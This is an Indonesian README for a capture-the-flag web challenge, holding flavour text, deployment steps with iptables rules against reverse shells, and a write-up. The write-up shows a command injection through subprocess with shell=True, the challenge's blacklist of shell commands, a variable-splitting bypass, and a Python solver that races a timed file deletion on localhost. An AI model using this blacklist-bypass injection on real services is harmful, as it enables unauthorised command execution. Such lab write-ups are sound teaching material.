# El Kebanteren

## Deskripsi
Prabu Banter I adalah raja yang bijaksana dan adil, dihormati oleh rakyatnya karena kepemimpinannya yang tegas namun penuh kasih. Ia dikenal karena kemampuannya mendengarkan suara rakyat dan membuat keputusan yang bijak dalam memimpin kerajaan yang subur dan makmur. Putranya, Raden Banter II, mewarisi sifat-sifat ayahnya, penuh semangat dan ambisi untuk membawa perubahan yang lebih baik bagi kerajaan, menjadikannya sosok yang diharapkan dapat melanjutkan legasi kebijaksanaan dan keberanian Prabu Banter I.

## Author
abdiery

## To Do ⚠

To Do List yang harus dilakukan setelah melakukan deploy challenge, yaitu menggunakan iptables demi mitigasi dari reverse shell dan cara unintended lainnya.

1. Deploy challenge
2. Masuk pada shell container docker dengan tambahan command --privileged
3. Masukan command berikut
    ```
    iptables -A OUTPUT -p tcp --sport 5000 -j ACCEPT
    iptables -P OUTPUT DROP
    ```

## Solve
Dapat diketahui terdapat sebuah kerentanan code injection di bagian:
```py
    process = subprocess.run(inputed, shell=True, capture_output=True, text=True)
    output = process.stdout
```

Namun terdapat blacklist seperti ini:
```py
    blacklist = [
    "ls", "cat", "rm", "mv", "id", "cp", "wget", "curl", "chmod", "chown", "find", "ps",
    "grep", "awk", "sed", "bash", "sh", "python", "perl", "php", "sudo", "whoami",
    "vi", "vim", "nano", "info", "uname", "more", "head", "less", "tail", "txt", "&&", "|", "`", "$(", ">", "<", "&", "'", '"', "*", "\n"
    ]
```

Untuk melakukan bypass, kita bisa menggunakan payload seperti berikut:

`s=s; l&s` == `ls`

Bila ingin melakukan listing directory, karena terdapat sleep sebesar 0.5 detik sebelum output file dihapus kita bisa menggunakan threading.

Sehingga didapat solver berikut:

```py
import requests
from datetime import datetime
import binascii
requests.packages.urllib3.disable_warnings()
import threading
import subprocess

url = "http://localhost:5000/"

s = requests.Session()

inputed = "d=d; i$d"

data_req = {
    "input": inputed,
    "submit": "Submit"
}

def exp_get_id():
    r = s.post(url + "get_quotes", data=data_req, verify=False)
    get_date_minute = datetime.now().strftime('%Y%m%d%H%M')
    random_number = binascii.hexlify(get_date_minute.encode()).decode()
    filename = f'{random_number}.txt'
    return filename

def get_response():
    r = s.get(url + "generated_quotes/" + exp_get_id(), verify=False)
    # print("Click the link: " + url + "generated_quotes/" + exp_get_id())
    print(r.text)

if __name__ == "__main__":
    threading.Thread(target=get_response).start()
```
